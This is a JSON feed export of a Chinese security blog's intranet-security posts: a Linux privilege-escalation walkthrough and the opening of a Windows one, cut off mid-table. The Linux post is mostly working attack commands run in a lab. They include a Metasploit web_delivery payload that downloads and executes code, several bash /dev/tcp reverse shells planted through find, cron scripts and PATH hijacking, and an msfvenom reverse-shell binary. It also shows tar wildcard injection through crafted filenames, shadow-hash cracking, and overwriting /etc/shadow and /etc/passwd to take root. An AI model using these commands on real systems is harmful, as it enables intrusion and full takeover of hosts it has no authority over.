{
    "version": "https://jsonfeed.org/version/1",
    "title": "云逸'bolg • All posts by \"内网安全\" category",
    "description": "",
    "home_page_url": "http://gyzero.shop",
    "items": [
        {
            "id": "http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/",
            "url": "http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/",
            "title": "linux提权",
            "date_published": "2023-11-10T09:52:23.000Z",
            "content_html": "<h3 id=\"信息收集命令\"><a class=\"markdownIt-Anchor\" href=\"#信息收集命令\">#</a> 信息收集命令</h3>\n<h4 id=\"系统信息\"><a class=\"markdownIt-Anchor\" href=\"#系统信息\">#</a> 系统信息</h4>\n<ul>\n<li><strong> <code>uname -a</code> </strong>: 显示内核、操作系统和 CPU 信息。</li>\n<li><strong> <code>head -n 1 /etc/issue</code> </strong>: 显示操作系统版本。</li>\n<li><strong> <code>cat /proc/version</code> </strong>: 显示系统信息。</li>\n<li><strong> <code>hostname</code> </strong>: 显示计算机名。</li>\n<li><strong> <code>env</code> </strong>: 显示环境变量。</li>\n</ul>\n<h4 id=\"网络信息\"><a class=\"markdownIt-Anchor\" href=\"#网络信息\">#</a> 网络信息</h4>\n<ul>\n<li><strong> <code>ifconfig</code> </strong>: 显示网络接口信息（现在更常用的是 <code>ip addr show</code> ）。</li>\n<li><strong> <code>netstat -lntp</code> </strong>: 显示所有监听端口。</li>\n<li><strong> <code>netstat -antp</code> </strong>: 显示所有已建立的连接。</li>\n<li><strong> <code>netstat -s</code> </strong>: 显示网络统计信息。</li>\n<li><strong> <code>iptables -L</code> </strong>: 显示防火墙设置。</li>\n<li><strong> <code>route -n</code> </strong>: 显示路由表。</li>\n</ul>\n<h4 id=\"用户组信息系统服务\"><a class=\"markdownIt-Anchor\" href=\"#用户组信息系统服务\">#</a> 用户组信息系统服务</h4>\n<ul>\n<li><strong> <code>w</code> </strong>：显示活动用户和他们正在使用的终端等信息。</li>\n<li><strong> <code>id [username]</code> </strong>：显示指定用户的信息，包括用户 ID（UID）、所属用户组等。</li>\n<li><strong> <code>last</code> </strong>：显示用户登录的历史记录，包括登录时间和来源。</li>\n<li><strong> <code>cut -d: -f1 /etc/passwd</code> </strong>：显示系统上所有用户的用户名。</li>\n<li><strong> <code>cut -d: -f1 /etc/group</code> </strong>：显示系统上所有组的组名。</li>\n<li><strong> <code>crontab -l</code> </strong>：显示当前用户的计划任务（定时任务）。</li>\n<li><strong> <code>chkconfig --list</code> </strong>：列出所有系统服务。</li>\n<li><strong> <code>chkconfig --list | grep on</code> </strong>：列出所有已启动的系统服务。</li>\n<li><strong> <code>echo $PATH</code> </strong>：显示系统的路径列表，用冒号分隔的目录列表表示系统在搜索可执行文件时的顺序。</li>\n</ul>\n<h4 id=\"信息收集\"><a class=\"markdownIt-Anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p><code>nmap -sT 192.168.244.0/24</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190515553.png\" alt=\"\"></p>\n<p>访问 80 没啥东西扫一下目录</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190852090.png\" alt=\"image-20231121190852090\"></p>\n<p>扫到一个 shell.php</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191144694.png\" alt=\"image-20231121191144694\"></p>\n<h4 id=\"反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>参数是 cmd 可以执行命令</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191211218.png\" alt=\"image-20231121191211218\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191300474.png\" alt=\"image-20231121191300474\"></p>\n<p><code>msf script/web_delivery模块 反弹shell</code></p>\n<p><code>use exploit/multi/script/web_delivery </code></p>\n<p><code>set lhost 192.168.244.128</code></p>\n<p><code>set lport 9000</code></p>\n<p><code>run</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191557311.png\" alt=\"image-20231121191557311\"></p>\n<p>复制 payload 并且 url 编码添加在 cmd 参数后面执行得到 shell</p>\n<p><code>python%20-c%20%22import%20sys%3Bimport%20ssl%3Bu%3D__import__('urllib'%2B%7B2%3A''%2C3%3A'.request'%7D%5Bsys.version_info%5B0%5D%5D%2Cfromlist%3D('urlopen'%2C))%3Br%3Du.urlopen('http%3A%2F%2F192.168.244.128%3A8080%2FsZTvRL2bM'%2C%20context%3Dssl._create_unverified_context())%3Bexec(r.read())%3B%22</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191810361.png\" alt=\"image-20231121191810361\"></p>\n<h4 id=\"主机信息收集\"><a class=\"markdownIt-Anchor\" href=\"#主机信息收集\">#</a> 主机信息收集</h4>\n<p>先拿一个交互 shell</p>\n<p><code>**python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'**</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121192112964.png\" alt=\"image-20231121192112964\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>显示内核、操作系统和CPU信息</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Linux osboxes <span class=\"token number\">4.15</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">45</span><span class=\"token operator\">-</span>generic <span class=\"token comment\">#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>操作系统版本</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Linux Lite <span class=\"token number\">4.4</span> LTS \\n \\l</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>显示系统信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Linux version <span class=\"token number\">4.15</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">45</span><span class=\"token operator\">-</span>generic <span class=\"token punctuation\">(</span>buildd@lgw01<span class=\"token operator\">-</span>amd64<span class=\"token operator\">-</span><span class=\"token number\">031</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>gcc version <span class=\"token number\">7.3</span><span class=\"token number\">.0</span> <span class=\"token punctuation\">(</span>Ubuntu <span class=\"token number\">7.3</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span>16ubuntu3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>环境变量</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>env</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>APACHE_LOG_DIR<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>log<span class=\"token operator\">/</span>apache2</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>LANG<span class=\"token operator\">=</span>C</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>INVOCATION_ID<span class=\"token operator\">=</span>15ecc432bc2940368927675d4ac3a3a3</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>APACHE_LOCK_DIR<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>lock<span class=\"token operator\">/</span>apache2</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>PWD<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>JOURNAL_STREAM<span class=\"token operator\">=</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token number\">21980</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>APACHE_RUN_GROUP<span class=\"token operator\">=</span>user6</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>APACHE_RUN_DIR<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>run<span class=\"token operator\">/</span>apache2</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>APACHE_RUN_USER<span class=\"token operator\">=</span>user6</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>APACHE_PID_FILE<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>run<span class=\"token operator\">/</span>apache2<span class=\"token operator\">/</span>apache2<span class=\"token punctuation\">.</span>pid</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>SHLVL<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>PATH<span class=\"token operator\">=</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token builtin\">bin</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>_<span class=\"token operator\">=</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token operator\">/</span>env</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>计算机名</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>osboxes</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>系统路径列表</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token builtin\">bin</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>开启的服务</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>mysql 开启</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>用户</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>vboxadd</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>user1</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>user2</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>user3</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>user4</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>statd</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>user5</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>user6</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mysql</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>user7</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>user8</pre></td></tr></table></figure><h4 id=\"suid提权\"><a class=\"markdownIt-Anchor\" href=\"#suid提权\">#</a> suid 提权</h4>\n<p>SUID（Set User ID）是一种权限设置，允许用户以文件所有者的权限来执行文件，即使用户自身的权限可能不足以执行该文件。</p>\n<p>在 Unix 或类 Unix 系统中，当一个可执行文件的 SUID 位被设置为 1 时，无论谁执行该文件，都会以该文件的所有者身份执行。这种权限设置通常用于系统文件或程序，以便允许普通用户执行特定的任务或命令，而无需暴露超出其权限范围的访问权限。</p>\n<p><code>find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000-print2&gt;/dev/null find / -user root -perm -4000-exec ls -ldb &#123;&#125; \\;</code></p>\n<p>在 Unix 或 Linux 系统中查找具有 SUID 权限设置的文件。它会搜索整个文件系统 (“/”)，找到具有 SUID 权限设置的文件 (“-perm  -u=s”) 并将它们显示出来。同时，将任何错误消息重定向到 /dev/null，以避免它们显示在屏幕上。</p>\n<p>常见的提权文件</p>\n<p><code>nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</code></p>\n<p>查询到有一个 find</p>\n<p>cd /  cd /tmp 到 tmp 目录</p>\n<p>创建一个文件</p>\n<p>touch 1234</p>\n<p>find 1234 -exec whoami ;</p>\n<p>这个命令的作用是在当前目录下搜索名为 “1234” 的文件或目录，并对找到的每一个执行  <code>whoami</code>  命令。</p>\n<p><code>find</code>  命令用于查找文件和目录， <code>-exec</code>  选项允许在找到的每一个项目上执行特定的命令， <code>\\;</code>  表示命令结束。</p>\n<p>如果在当前目录下存在名为 “1234” 的文件或目录，对于每一个找到的 “1234”， <code>whoami</code>  命令将被执行，显示当前执行命令的用户的用户名。</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132333459.png\" alt=\"image-20240207132333459\"></p>\n<p>反弹 shell</p>\n<p><code>find /etc/passwd -exec bash -ip &gt;&amp; /dev/tcp/192.168.244.128/4343 0&gt;&amp;1 \\;</code></p>\n<p>nc 开启监听接收到会话</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132540518.png\" alt=\"image-20240207132540518\"></p>\n<h4 id=\"可读shadow文件利用\"><a class=\"markdownIt-Anchor\" href=\"#可读shadow文件利用\">#</a> 可读 shadow 文件利用</h4>\n<p>Shadow 文件的概述:</p>\n<p>Shadow 文件是一个 Linux 系统中存储加密用户密码和其他身份信息，如账号过期时间，密码过期时间，账户锁定和密码最小长度等等的重要文件。</p>\n<p>Shadow 文件位于 /etc/shadow ，只有 root 用户有权限访问它。</p>\n<p>shadow 文件与 passwd 文件的关系：早些版本加密后的密码是保存在 passwd 文件里第二个字段的位置也就是图中 x 的位置</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221212919749.png\" alt=\"image-20240221212919749\"></p>\n<p>但是呢虽然是加密的还是有可能被破解所以加上了 shadow 这个文件而 passwd 文件里的就被替换为了 X 占位，因为 shadow 文件只有 root 用户可以访问所以相对比较安全，不过有时管理员对文件权限错误配置也会导致被拿来恶意利用</p>\n<p>文件格式：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>root:<span class=\"token variable\">$6</span><span class=\"token variable\">$mqjgcFoM</span><span class=\"token variable\">$X</span>/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</pre></td></tr></table></figure><p>利用条件 shadow 有权查看</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213805632.png\" alt=\"image-20240221213805632\"></p>\n<p>获取 root 用户信息并保存在新建文件中</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213918116.png\" alt=\"image-20240221213918116\"></p>\n<p>root:<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>6</mn></mrow><annotation encoding=\"application/x-tex\">6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">6</span></span></span></span>mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</p>\n<p>利用工具 john 来破解</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220225042.png\" alt=\"image-20240221220225042\"></p>\n<p>得到明文密码就可以切换 root 了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220330572.png\" alt=\"image-20240221220330572\"></p>\n<h4 id=\"可写shadow文件利用\"><a class=\"markdownIt-Anchor\" href=\"#可写shadow文件利用\">#</a> 可写 shadow 文件利用</h4>\n<p>利用原理：把 shadow 文件里 root 用户 hash 值替换为自己生成的就可以 hash 再用生成用到的明文进行登录 root</p>\n<p>前提要有 shadow 可写权限</p>\n<p>通过 mkpasswd 生成哈希</p>\n<p><code>mkpasswd -m sha-512 1234567</code></p>\n<p><code>$6$hpRA5YNV9lAANtsF$JwX/K8VfxhxpTm5U2oTEgFw.YiYVCmfzZ0i6SqUDkpJRamWVmQ0LgflQUlhjVHkAS5N8MwFFR12mHBg6qFhwC/</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221309745.png\" alt=\"image-20240221221309745\"></p>\n<p>用 sha-521 是因为</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$6</span>$开头的，表明是用SHA-512加密的，密文长度86</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token variable\">$1</span>$ 表明是用MD5加密的，密文长度22个字符</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token variable\">$2</span>$ 是用Blowfish加密的，</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token variable\">$5</span>$ 是用 SHA-256加密的，密文长度43</pre></td></tr></table></figure><p>接着把生成的 hash 替换原本的就可以用 1234567 登陆了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221221617115.png\" alt=\"image-20240221221617115\"></p>\n<h4 id=\"可写passwd文件利用\"><a class=\"markdownIt-Anchor\" href=\"#可写passwd文件利用\">#</a> 可写 passwd 文件利用</h4>\n<p>虽然 passwd 文件里 hash 被 X 替代了无法查看但是把 X 替换为我们生成的 hash 还是可以登陆的</p>\n<p>利用 openssl 生成</p>\n<p><code>openssl passwd 987654321</code></p>\n<p><code>$1$uOZ/Tr4f$EqDyR9WU8wJNeB3tEY09f.</code></p>\n<p>把 passwd 里 root 的 X 替换</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221222616639.png\" alt=\"image-20240221222616639\"></p>\n<p>即可用 987654321 切换 root</p>\n<h4 id=\"计划任务提权\"><a class=\"markdownIt-Anchor\" href=\"#计划任务提权\">#</a> 计划任务提权</h4>\n<p>查看计划任务</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222000243892.png\" alt=\"image-20240222000243892\"></p>\n<p><code>* * * * * root    /home/crontab.sh</code></p>\n<p>这条计划任务的意思是每 1 分钟执行一次 crontab.sh 脚本，并且是以 root 用户的权限来执行。</p>\n<p>而这个文件我们是有权更改的那么就可以写入反弹 shell 命令</p>\n<p><code>echo 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.139/4444 0&gt;&amp;1&quot;' &gt; crontab.sh</code></p>\n<p>nc 进行监听等一分钟拿 shell</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222003928818.png\" alt=\"image-20240222003928818\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240222005508201.png\" alt=\"image-20240222005508201\"></p>\n<h4 id=\"计划任务环境变量提权\"><a class=\"markdownIt-Anchor\" href=\"#计划任务环境变量提权\">#</a> 计划任务环境变量提权</h4>\n<p>如果你在计划任务中没有指定程序的绝对路径，系统会在 crontab 文件中的 <code>PATH</code>  环境变量所列出的目录中查找该程序。这些目录会按照在 <code>PATH</code>  变量中的顺序被检查。如果在某个目录中找到了该程序，系统就会停止搜索并执行该程序。</p>\n<p>图中每分钟执行一次 <code>shell.sh</code>  脚本但是没有指定绝对路径， <code>PATH</code>  中默认优先查找 /home/yunyi 路径下有没有 shell.sh 有的话</p>\n<p>就每分钟执行，利用这个特性就可以在 <code>yunyi</code>  目录中创建一个 <code>shell.sh</code>  并写上反弹 shell 进行提权</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png\" alt=\"image-20240223220655325\"></p>\n<p><code>#!/bin/bash</code></p>\n<p><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.142/7676 0&gt;&amp;1&quot;</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220835815.png\" alt=\"image-20240223220835815\"></p>\n<p>别忘了给执行权限 <code>chmod +x shell.sh</code></p>\n<p><code>kali：nc -vlnp 7676</code></p>\n<p>获取 shell</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221033086.png\" alt=\"image-20240223221033086\"></p>\n<h4 id=\"计划任务统配符提权\"><a class=\"markdownIt-Anchor\" href=\"#计划任务统配符提权\">#</a> 计划任务统配符提权</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223220655325.png\" alt=\"image-20240223220655325\"></p>\n<p>这里还有一个 zip.sh 看一下内容是</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240223221316077.png\" alt=\"image-20240223221316077\"></p>\n<p>到 home/yunyi/user 目录下打包所有文件夹文件到 /tmp 目录下名为 yunyi.tar.gz</p>\n<p>利用 tar <code>命令的</code> –checkpoint <code>和</code> –checkpoint-action</p>\n<p>tar <code>命令的</code> –checkpoint <code>和</code> –checkpoint-action <code>参数可以被用来执行提权操作这是因为</code>  tar` 命令在处理文件时，可以在每个检查点 checkpoint 执行一个特定的动作 action</p>\n<p>如果管理员给予了某个普通用户 <code>tar</code>  命令的超级管理员操作权限，那么我们可以使用 <code>tar</code>  命令进行提权例如，以下命令可以创建一个新的归档文件，并在每个检查点执行 <code>/bin/bash</code>  命令</p>\n<p><code>sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&quot;/bin/bash&quot;</code></p>\n<p>在这个命令中， <code>--checkpoint=1</code>  表示每处理一个文件就设置一个检查点， <code>--checkpoint-action=exec=&quot;/bin/bash&quot;</code>  表示在每个检查点执行 <code>/bin/bash</code>  命令因为 <code>tar</code>  命令是以 <code>root</code>  用户的身份运行的，所以 <code>/bin/bash</code>  命令也会以 <code>root</code>  用户的身份运行，从而获得 <code>root</code>  权限</p>\n<p>kali 生成反弹 shell 文件</p>\n<p><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.142 LPORT=8989 -f elf -o shell.elf</code></p>\n<p>启动一个 http 服务受害机下载 shell 文件并给予权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132512587.png\" alt=\"image-20240224132512587\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224132558854.png\" alt=\"image-20240224132558854\"></p>\n<p>在 user 目录创建这两个文件</p>\n<p><code>touch /home/yunyi/user/--checkpoint-action=exec=shell.elf</code></p>\n<p><code>touch /home/yunyi/user/--checkpoint=1</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224133036613.png\" alt=\"image-20240224133036613\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240224140015673.png\" alt=\"image-20240224140015673\"></p>\n<p><code>nc -lvnp 8989</code>  拿到权限</p>\n<p>也可以创建一个 sh 脚本反弹 shell</p>\n<p><code>touch /home/yunyi/user/--checkpoint-action=exec=sh shell.sh</code></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/",
            "url": "http://gyzero.shop/2023/11/09/network-security/neiwang/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/",
            "title": "Windows提权",
            "date_published": "2023-11-09T12:28:50.000Z",
            "content_html": "<h3 id=\"提权基础\"><a class=\"markdownIt-Anchor\" href=\"#提权基础\">#</a> <span class=\"label\">提权基础</span></h3>\n<p>获取 webshell 后一般都是 www-data 权限权限很低所以要进行提权把权限提高为了后续渗透顺利</p>\n<p>windows 的常用提权方法，主要分为漏洞提权、windwos 特性提权、第三方组件提权，数据库提权 ftp 提权 令牌窃取提权等姿势。</p>\n<p>使用 Windows 命令提示符执行的，它将系统信息输出到名为 &quot;a.txt&quot; 的文件中，然后检查特定的 Windows 更新是否已安装。如果某些指定的更新未安装，它会输出一条消息表示这些更新未安装。最后，它会删除临时文件 &quot;a.txt</p>\n<p>systeminfo&gt;a.txt&amp;(for %i in (KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 kb942831 KB2503665 KB2592799) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;del /f /q /a a.txt</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/win%E6%8F%90%E6%9D%83/image-20231110225111274.png\" alt=\"image-20231110225111274\"></p>\n<p>提权辅助:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4v\">https://i.hacking8.com/tiquan/</span></p>\n<p>windows 漏洞集合<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=\"> https://github.com/SecWiki/windows-kernel-exploits</span></p>\n<h3 id=\"收集信息常用命令\"><a class=\"markdownIt-Anchor\" href=\"#收集信息常用命令\">#</a> <span class=\"label\">收集信息常用命令</span></h3>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ipconfig /all                                            --网卡配置</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>systeminfo                                               --系统补丁信息等</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo %PROCESSOR_ARCHITECTURE%                            --系统体系结构</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>wmic product get name,version                            --安装软件、版本、路径</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>wmic service list brief                                  --查询本机服务信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>tasklist -svc                                            --进程查看</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>schtasks /query /fo list /v                              --任务计划查询</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>net statistics workstation                               --开机时间</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>net user                                                 --查看用户</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>whoami /all                                              --SID等用户信息</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>net localgroup administrators                            --查看管理员组中的用户</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>net session                                              --会话查看</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>netstat -ano                                             --网络连接以及通过端口判断服务</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>net share                                                --共享</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>route print                                              --路由信息</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>arp -a                                                   --arp信息</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>cmdkey /l                                                --登录历史</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>hosts文件  Linux：/etc/hosts  Windows：c:\\Windows\\system32\\drivers\\etc\\hosts</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ipconfig  /displaydns                                    --dns缓存</pre></td></tr><tr><td 